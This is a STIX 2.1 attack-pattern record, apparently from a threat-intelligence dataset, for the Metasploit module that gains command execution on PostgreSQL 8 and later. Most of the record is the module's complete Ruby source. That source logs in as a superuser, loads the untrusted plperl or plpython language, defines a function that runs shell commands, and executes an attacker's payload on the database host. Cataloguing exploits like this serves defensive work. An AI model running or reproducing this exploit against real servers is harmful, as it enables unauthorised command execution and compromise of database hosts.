{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7266ff49-67d3-43c1-b161-97cbf56e83c4",
    "created": "2024-08-14T17:11:58.710497Z",
    "modified": "2024-08-14T17:11:58.710501Z",
    "name": "PostgreSQL CREATE LANGUAGE Execution",
    "description": "( Some installations of Postgres 8 and 9 are configured to allow loading external scripting languages. Most commonly this is Perl and Python. When enabled, command execution is possible on the host. To execute system commands, loading the \"untrusted\" version of the language is necessary. This requires a superuser. This is usually postgres. The execution should be platform-agnostic and has been tested on OS X, Windows, and Linux.  This module attempts to load Perl or Python to execute system commands. As this dynamically loads a scripting language to execute commands, it is not necessary to drop a file on the filesystem.  Only Postgres 8 and up are supported. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/postgres/postgres_createlang.rb",
            "external_id": "postgres_createlang.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.postgresql.org/docs/current/static/sql-createlanguage.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.postgresql.org/docs/current/static/plperl.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.postgresql.org/docs/current/static/plpython.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Postgres\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'PostgreSQL CREATE LANGUAGE Execution',\n      'Description' => %q(\n        Some installations of Postgres 8 and 9 are configured to allow loading external scripting languages.\n        Most commonly this is Perl and Python. When enabled, command execution is possible on the host.\n        To execute system commands, loading the \"untrusted\" version of the language is necessary.\n        This requires a superuser. This is usually postgres. The execution should be platform-agnostic,\n        and has been tested on OS X, Windows, and Linux.\n\n        This module attempts to load Perl or Python to execute system commands. As this dynamically loads\n        a scripting language to execute commands, it is not necessary to drop a file on the filesystem.\n\n        Only Postgres 8 and up are supported.\n      ),\n      'Author' => [\n        'Micheal Cottingham', # author of this module\n        'midnitesnake', # the postgres_payload module that this is based on,\n        'Nixawk' # Improves the module\n      ],\n      'License' => MSF_LICENSE,\n      'References' => [\n        ['URL', 'http://www.postgresql.org/docs/current/static/sql-createlanguage.html'],\n        ['URL', 'http://www.postgresql.org/docs/current/static/plperl.html'],\n        ['URL', 'http://www.postgresql.org/docs/current/static/plpython.html']\n      ],\n      'Platform' => %w(linux unix win osx),\n      'Payload' => {\n        'PayloadType' => %w(cmd)\n      },\n      'Arch' => [ARCH_CMD],\n      'Targets' => [\n        ['Automatic', {}]\n      ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2016-01-01'\n    ))\n\n    register_options([\n      Opt::RPORT(5432)\n    ])\n\n    deregister_options('SQL', 'RETURN_ROWSET', 'VERBOSE')\n  end\n\n  def check\n    vuln_version? ? CheckCode::Appears : CheckCode::Safe\n  end\n\n  def vuln_version?\n    version = postgres_fingerprint\n\n    return unless version[:auth]\n\n    vprint_status version[:auth].to_s\n\n    version_full = version[:auth].to_s.scan(/^PostgreSQL ([\\d\\.]+)/i).flatten.first\n\n    if Rex::Version.new(version_full) >= Rex::Version.new('8.0')\n      return true\n    else\n      return false\n    end\n  end\n\n  def login_success?\n    status = do_login(username, password, database)\n    case status\n    when :noauth\n      print_error \"#{peer} - Authentication failed\"\n      return false\n    when :noconn\n      print_error \"#{peer} - Connection failed\"\n      return false\n    else\n      print_status \"#{peer} - #{status}\"\n      return true\n    end\n  end\n\n  def load_extension?(language)\n    case load_procedural_language(language, 'LANGUAGE')\n    when :exists\n      print_good \"#{peer} - #{language} is already loaded, continuing\"\n      return true\n    when :loaded\n      print_good \"#{peer} - #{language} was successfully loaded, continuing\"\n      return true\n    when :not_exists\n      print_status \"#{peer} - #{language} could not be loaded\"\n      return false\n    else\n      vprint_error \"#{peer} - error occurred loading #{language}\"\n      return false\n    end\n  end\n\n  def exec_function?(func_name)\n    query = \"SELECT exec_#{func_name}('#{payload.encoded.gsub(\"'\", \"''\")}')\"\n    select_query = postgres_query(query)\n\n    case select_query.keys[0]\n    when :conn_error\n      print_error \"#{peer} - Connection error\"\n      return false\n    when :sql_error\n      print_warning \"#{peer} - Unable to execute query: #{query}\"\n      return false\n    when :complete\n      print_good \"#{peer} - Exploit successful\"\n      return true\n    else\n      print_error \"#{peer} - Unknown\"\n      return false\n    end\n  end\n\n  def create_function?(language, func_name)\n    load_func = ''\n\n    case language\n    when 'perl'\n      query = \"CREATE OR REPLACE FUNCTION exec_#{func_name}(text) RETURNS void as $$\"\n      query << \"`$_[0]`;\"\n      query << \"$$ LANGUAGE pl#{language}u\"\n      load_func = postgres_query(query)\n    when /^python(?:2|3)?/i\n      query = \"CREATE OR REPLACE FUNCTION exec_#{func_name}(c text) RETURNS void as $$\\r\"\n      query << \"import subprocess, shlex\\rsubprocess.check_output(shlex.split(c))\\r\"\n      query << \"$$ LANGUAGE pl#{language}u\"\n      load_func = postgres_query(query)\n    end\n\n    case load_func.keys[0]\n    when :conn_error\n      print_error \"#{peer} - Connection error\"\n      return false\n    when :sql_error\n      print_error \"#{peer} Exploit failed\"\n      return false\n    when :complete\n      print_good \"#{peer} - Loaded UDF (exec_#{func_name})\"\n      return true\n    else\n      print_error \"#{peer} - Unknown\"\n      return false\n    end\n  end\n\n  def load_procedural_language(language, extension)\n    query = \"CREATE #{extension} pl#{language}u\"\n    load_language = postgres_query(query)\n    return :loaded unless load_language.keys[0] == :sql_error\n\n    match_exists = load_language[:sql_error].match(/(?:(extension|language) \"pl#{language}u\" already exists)/m)\n    return :exists if match_exists\n\n    match_error = load_language[:sql_error].match(/(?:could not (?:open extension control|access) file|unsupported language)/m)\n    return :not_exists if match_error\n  end\n\n  def do_login(user, pass, database)\n    begin\n      password = pass || postgres_password\n      result = postgres_fingerprint(\n        db: database,\n        username: user,\n        password: password\n      )\n\n      return result[:auth] if result[:auth]\n      print_error \"#{peer} - Login failed\"\n      return :noauth\n\n    rescue Rex::ConnectionError\n      return :noconn\n    end\n  end\n\n  def exploit\n    return unless vuln_version?\n    return unless login_success?\n\n    languages = %w(perl python python2 python3)\n    languages.each do |language|\n      next unless load_extension?(language)\n      func_name = Rex::Text.rand_text_alpha(10)\n      next unless create_function?(language, func_name)\n      if exec_function?(func_name)\n        print_warning \"Please clear extension [#{language}]: function [#{func_name}] manually\"\n        break\n      end\n    end\n    postgres_logout if @postgres_conn\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-01-01",
    "x_mitre_platforms": [
        "%w(linux unix win osx)"
    ]
}